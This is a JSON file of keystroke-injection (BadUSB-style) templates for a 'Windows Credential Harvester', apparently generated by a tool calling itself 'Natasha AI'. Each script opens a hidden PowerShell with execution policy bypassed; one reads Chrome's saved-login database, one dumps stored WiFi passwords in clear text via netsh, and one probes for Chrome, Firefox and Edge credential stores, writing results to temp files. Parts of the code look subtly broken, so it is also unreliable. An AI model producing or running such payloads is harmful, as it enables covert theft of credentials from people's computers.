{
  "metadata": {
    "name": "Windows Credential Harvester",
    "description": "Extracts stored credentials from Windows systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Chrome Password Extractor",
      "description": "Extracts saved passwords from Chrome browser",
      "attack_type": "credential_harvest",
      "script": [
        "REM Chrome Password Extractor for Windows",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass",
        "ENTER",
        "DELAY 1000",
        "STRING $outputFile = &quot;$env:TEMP\\chrome_passwords.txt&quot;",
        "ENTER",
        "STRING $loginDataPath = &quot;$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data&quot;",
        "ENTER",
        "STRING if (Test-Path $loginDataPath) {",
        "ENTER",
        "STRING   Copy-Item -Path $loginDataPath -Destination &quot;$env:TEMP\\Login Data&quot; -Force",
        "ENTER",
        "STRING   Add-Type -AssemblyName System.Security",
        "ENTER",
        "STRING   Add-Type -AssemblyName System.Data",
        "ENTER",
        "STRING   $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection",
        "ENTER",
        "STRING   $conn.ConnectionString = &quot;Data Source=$env:TEMP\\Login Data&quot;",
        "ENTER",
        "STRING   $conn.Open()",
        "ENTER",
        "STRING   $cmd = $conn.CreateCommand()",
        "ENTER",
        "STRING   $cmd.CommandText = &quot;SELECT origin_url, username_value, password_value FROM logins&quot;",
        "ENTER",
        "STRING   $reader = $cmd.ExecuteReader()",
        "ENTER",
        "STRING   &quot;Chrome Passwords:&quot; | Out-File -FilePath $outputFile",
        "ENTER",
        "STRING   &quot;==================&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING   while ($reader.Read()) {",
        "ENTER",
        "STRING     $url = $reader.GetString(0)",
        "ENTER",
        "STRING     $username = $reader.GetString(1)",
        "ENTER",
        "STRING     &quot;URL: $url&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING     &quot;Username: $username&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING     &quot;Password: [ENCRYPTED]&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING     &quot;------------------&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING   }",
        "ENTER",
        "STRING   $reader.Close()",
        "ENTER",
        "STRING   $conn.Close()",
        "ENTER",
        "STRING   Write-Host &quot;Credentials saved to $outputFile&quot;",
        "ENTER",
        "STRING } else {",
        "ENTER",
        "STRING   Write-Host &quot;Chrome Login Data file not found.&quot;",
        "ENTER",
        "STRING }",
        "ENTER",
        "DELAY 1000",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "browser": "chrome",
        "exfil_method": "file"
      }
    },
    {
      "name": "WiFi Password Extractor",
      "description": "Extracts saved WiFi passwords from Windows",
      "attack_type": "credential_harvest",
      "script": [
        "REM WiFi Password Extractor for Windows",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass",
        "ENTER",
        "DELAY 1000",
        "STRING $outputFile = &quot;$env:TEMP\\wifi_passwords.txt&quot;",
        "ENTER",
        "STRING &quot;WiFi Passwords:&quot; | Out-File -FilePath $outputFile",
        "ENTER",
        "STRING &quot;===============&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING $networks = netsh wlan show profiles | Select-String '\\s+:\\s+' | ForEach-Object { $_.ToString().Split(':')[1].Trim() }",
        "ENTER",
        "STRING foreach ($network in $networks) {",
        "ENTER",
        "STRING   $password = netsh wlan show profile name=&quot;$network&quot; key=clear | Select-String 'Key Content\\s+:\\s+' | ForEach-Object { $_.ToString().Split(':')[1].Trim() }",
        "ENTER",
        "STRING   &quot;Network: $network&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING   &quot;Password: $password&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING   &quot;------------------&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING Write-Host &quot;WiFi passwords saved to $outputFile&quot;",
        "ENTER",
        "DELAY 1000",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "credential_type": "wifi",
        "exfil_method": "file"
      }
    },
    {
      "name": "All Browser Credentials",
      "description": "Extracts credentials from multiple browsers",
      "attack_type": "credential_harvest",
      "script": [
        "REM Multi-Browser Credential Harvester for Windows",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass",
        "ENTER",
        "DELAY 1000",
        "STRING $outputFile = &quot;$env:TEMP\\browser_credentials.txt&quot;",
        "ENTER",
        "STRING &quot;Browser Credentials:&quot; | Out-File -FilePath $outputFile",
        "ENTER",
        "STRING &quot;===================&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING &quot;Chrome:&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING $chromeLoginData = &quot;$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data&quot;",
        "ENTER",
        "STRING if (Test-Path $chromeLoginData) { &quot;Chrome data found&quot; | Out-File -FilePath $outputFile -Append } else { &quot;Chrome data not found&quot; | Out-File -FilePath $outputFile -Append }",
        "ENTER",
        "STRING &quot;Firefox:&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING $firefoxProfiles = &quot;$env:APPDATA\\Mozilla\\Firefox\\Profiles&quot;",
        "ENTER",
        "STRING if (Test-Path $firefoxProfiles) { &quot;Firefox profiles found&quot; | Out-File -FilePath $outputFile -Append } else { &quot;Firefox profiles not found&quot; | Out-File -FilePath $outputFile -Append }",
        "ENTER",
        "STRING &quot;Edge:&quot; | Out-File -FilePath $outputFile -Append",
        "ENTER",
        "STRING $edgeLoginData = &quot;$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data&quot;",
        "ENTER",
        "STRING if (Test-Path $edgeLoginData) { &quot;Edge data found&quot; | Out-File -FilePath $outputFile -Append } else { &quot;Edge data not found&quot; | Out-File -FilePath $outputFile -Append }",
        "ENTER",
        "STRING Write-Host &quot;Browser credential scan saved to $outputFile&quot;",
        "ENTER",
        "DELAY 1000",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "browser": "all",
        "exfil_method": "file"
      }
    }
  ]
}